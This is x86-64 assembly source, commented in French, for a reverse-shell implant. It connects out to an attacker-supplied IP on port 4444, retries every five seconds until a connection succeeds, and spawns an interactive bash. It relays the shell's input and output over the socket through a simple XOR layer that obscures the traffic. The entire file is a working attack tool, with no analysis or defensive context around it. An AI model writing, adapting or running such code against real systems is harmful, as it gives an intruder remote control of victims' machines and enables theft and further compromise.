section .data
    ; Configuration du chiffrement XOR
    xor_key      db 0x41, 0x42, 0x43, 0x44
    
    ; Commandes et arguments pour le fancy shell
    command      db '/bin/bash',0
    bash_i       db '-i',0
    bash_args    dq command, bash_i, 0
    
    ; Configuration réseau
    timespec     dq 5, 0          ; 5 secondes entre les tentatives    
    port_num     dw 4444          ; Port fixe
    
    ; Messages d'erreur
    err_usage    db 'Usage: ./reverse <attacker_ip>',10,0
    err_ip_format db 'Error: Invalid IP format',10,0
    err_socket   db 'Error: Socket creation failed',10,0
    err_connect  db 'Error: Connection failed',10,0

section .bss
    ip_bytes     resd 1           ; IP en format réseau
    port_bytes   resw 1           ; Port en format réseau
    sockaddr     resb 16          ; Structure sockaddr_in
    envp         resq 256         ; Tableau des variables d'environnement
    buffer       resb 8192        ; Buffer pour le chiffrement
    pipe_read    resd 1           ; Descripteur de lecture du pipe
    pipe_write   resd 1           ; Descripteur d'écriture du pipe

section .text
    global _start

;----------------------------------------------------------
; Validation et conversion de l'IP
;----------------------------------------------------------
validate_and_parse_ip:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    
    mov rsi, rdi
    xor rbx, rbx                  ; Compteur d'octets
    xor r12d, r12d                ; IP accumulée
    xor r13d, r13d                ; Valeur d'octet courante

.parse_loop:
    movzx edx, byte [rsi]
    test dl, dl
    jz .end_parse
    
    cmp dl, '.'
    je .store_octet
    
    cmp dl, '0'
    jb .invalid
    cmp dl, '9'
    ja .invalid
    
    sub dl, '0'
    imul r13d, r13d, 10
    add r13d, edx
    cmp r13d, 255
    ja .invalid
    
    inc rsi
    jmp .parse_loop

.store_octet:
    cmp bl, 3
    jae .invalid
    
    shl r12d, 8
    or r12d, r13d
    inc bl
    xor r13d, r13d
    inc rsi
    jmp .parse_loop

.end_parse:
    cmp bl, 3
    jne .invalid
    
    shl r12d, 8
    or r12d, r13d
    mov eax, r12d
    bswap eax
    mov [ip_bytes], eax
    mov rax, 1
    jmp .done

.invalid:
    xor rax, rax
.done:
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

;---------------------------------------------------------
;                       XOR Cipher 
;---------------------------------------------------------
xor_crypt:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13

    mov r10, rdi                  ; buffer
    mov r11, rsi                  ; longueur
    mov r12d, edx                 ; clé XOR
    xor r13, r13                  ; index

.loop:
    cmp r13, r11
    jae .end

    mov ecx, r13d
    and ecx, 3
    shl ecx, 3

    mov eax, r12d
    shr eax, cl
    and al, 0xFF

    mov bl, [r10 + r13]
    xor bl, al
    mov [r10 + r13], bl

    inc r13
    jmp .loop

.end:
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

;----------------------------------------------------------
; Gestion des arguments et environnement
;----------------------------------------------------------
jmp_arg:
    mov rax, [rbx]
    add rbx, 8
    test rax, rax
    jnz jmp_arg
    ret

jmp_envp:
    lea rdi, [envp]
env_loop:
    mov rax, [rbx]
    test rax, rax
    je done
    mov [rdi], rax
    add rdi, 8
    add rbx, 8
    jmp env_loop
done:
    mov qword [rdi], 0
    ret

;----------------------------------------------------------
; Proxy de chiffrement - Thread pour socket vers bash
;----------------------------------------------------------
proxy_socket_to_bash:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    push r14

    mov r12, rdi                  ; socket fd
    mov r13, rsi                  ; pipe write fd

.read_loop:
    ; Lire du socket
    mov rax, 0                    ; sys_read
    mov rdi, r12
    lea rsi, [buffer]
    mov rdx, 8192
    syscall

    test rax, rax
    jle .end

    mov r14, rax                  ; taille lue

    ; Déchiffrer
    lea rdi, [buffer]
    mov rsi, r14
    mov edx, [xor_key]
    call xor_crypt

    ; Écrire vers bash
    mov rax, 1                    ; sys_write
    mov rdi, r13
    lea rsi, [buffer]
    mov rdx, r14
    syscall

    jmp .read_loop

.end:
    pop r14
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

;----------------------------------------------------------
; Proxy de chiffrement - Thread pour bash vers socket
;----------------------------------------------------------
proxy_bash_to_socket:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    push r14

    mov r12, rdi                  ; pipe read fd
    mov r13, rsi                  ; socket fd

.read_loop:
    ; Lire de bash
    mov rax, 0                    ; sys_read
    mov rdi, r12
    lea rsi, [buffer]
    mov rdx, 8192
    syscall

    test rax, rax
    jle .end

    mov r14, rax                  ; taille lue

    ; Chiffrer
    lea rdi, [buffer]
    mov rsi, r14
    mov edx, [xor_key]
    call xor_crypt

    ; Écrire vers socket
    mov rax, 1                    ; sys_write
    mov rdi, r13
    lea rsi, [buffer]
    mov rdx, r14
    syscall

    jmp .read_loop

.end:
    pop r14
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

;----------------------------------------------------------
; Programme principal
;----------------------------------------------------------
_start:
    mov rbx, rsp
    
    pop rcx                       ; argc
    cmp rcx, 2
    jne usage_error

    call jmp_arg
    call jmp_envp
    
    pop rsi                       ; argv[0]
    pop rdi                       ; argv[1] (IP)
    
    call validate_and_parse_ip
    test rax, rax
    jz ip_error

    ; Convertir le port en format réseau
    mov ax, [port_num]
    xchg al, ah
    mov [port_bytes], ax

connection_loop:
    ; Création du socket
    mov rax, 41                   ; sys_socket
    mov rdi, 2                    ; AF_INET
    mov rsi, 1                    ; SOCK_STREAM
    xor rdx, rdx
    syscall 
    
    test rax, rax
    js socket_error
    mov r8, rax                   ; Socket fd

    ; Configuration sockaddr_in
    lea rdi, [sockaddr]
    mov word [rdi], 2
    mov ax, [port_bytes]
    mov word [rdi+2], ax
    mov eax, [ip_bytes]
    mov dword [rdi+4], eax
    mov qword [rdi+8], 0

    ; Connexion
    mov rax, 42                   ; sys_connect
    mov rdi, r8
    lea rsi, [sockaddr]
    mov rdx, 16
    syscall
    
    test rax, rax
    js connect_error

    ; Créer pipes pour communiquer avec bash
    ; Pipe 1: nous -> bash
    sub rsp, 8
    mov rax, 22                   ; sys_pipe
    mov rdi, rsp
    syscall
    test rax, rax
    js exit_program
    
    mov eax, [rsp]                ; read end
    mov [pipe_read], eax
    mov eax, [rsp+4]              ; write end  
    mov [pipe_write], eax
    add rsp, 8

    ; Pipe 2: bash -> nous
    sub rsp, 8
    mov rax, 22                   ; sys_pipe
    mov rdi, rsp
    syscall
    test rax, rax
    js exit_program
    
    mov r9d, [rsp]                ; read end (bash output)
    mov r10d, [rsp+4]             ; write end (bash input)
    add rsp, 8

    ; Fork pour créer le processus bash
    mov rax, 57                   ; sys_fork
    syscall
    test rax, rax
    jz .bash_process
    js exit_program

    ; Processus parent - gestion des proxies
    mov r11, rax                  ; PID bash

    ; Fermer les descripteurs inutiles
    mov rax, 3
    mov rdi, [pipe_read]
    syscall
    mov rax, 3
    mov rdi, r10
    syscall

    ; Fork pour le proxy socket->bash
    mov rax, 57                   ; sys_fork
    syscall
    test rax, rax
    jz .proxy_to_bash
    js exit_program

    ; Processus principal - proxy bash->socket
    mov rdi, r9                   ; read from bash
    mov rsi, r8                   ; write to socket
    call proxy_bash_to_socket
    jmp exit_program

.proxy_to_bash:
    ; Processus enfant - proxy socket->bash
    mov rdi, r8                   ; read from socket
    mov rsi, [pipe_write]         ; write to bash
    call proxy_socket_to_bash
    mov rax, 60
    xor rdi, rdi
    syscall

.bash_process:
    ; Processus bash - rediriger stdin/stdout vers les pipes
    
    ; stdin = pipe_read
    mov rax, 33                   ; sys_dup2
    mov rdi, [pipe_read]
    mov rsi, 0
    syscall
    
    ; stdout = pipe write end (r10)
    mov rax, 33                   ; sys_dup2
    mov rdi, r10
    mov rsi, 1
    syscall
    
    ; stderr = pipe write end (r10)
    mov rax, 33                   ; sys_dup2
    mov rdi, r10
    mov rsi, 2
    syscall

    ; Fermer les descripteurs inutiles
    mov rax, 3
    mov rdi, [pipe_read]
    syscall
    mov rax, 3
    mov rdi, [pipe_write]
    syscall
    mov rax, 3
    mov rdi, r9
    syscall
    mov rax, 3
    mov rdi, r10
    syscall
    mov rax, 3
    mov rdi, r8
    syscall

    ; Lancer bash interactif
    mov rax, 59                   ; sys_execve
    lea rdi, [command]            ; /bin/bash
    lea rsi, [bash_args]          ; ["/bin/bash", "-i", NULL]
    lea rdx, [envp]               ; variables d'environnement
    syscall

    ; Si execve échoue
    mov rax, 60
    mov rdi, 1
    syscall

;----------------------------------------------------------
; Gestion des erreurs
;----------------------------------------------------------
usage_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_usage]
    mov rdx, 30
    syscall
    jmp exit_program

ip_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_ip_format]
    mov rdx, 25
    syscall
    jmp exit_program

socket_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_socket]
    mov rdx, 28
    syscall
    jmp exit_program

connect_error:
    mov rax, 3
    mov rdi, r8
    syscall

    mov rax, 35                   ; sys_nanosleep
    lea rdi, [timespec]
    xor rsi, rsi
    syscall
    jmp connection_loop

exit_program:
    mov rax, 60
    xor rdi, rdi
    syscall
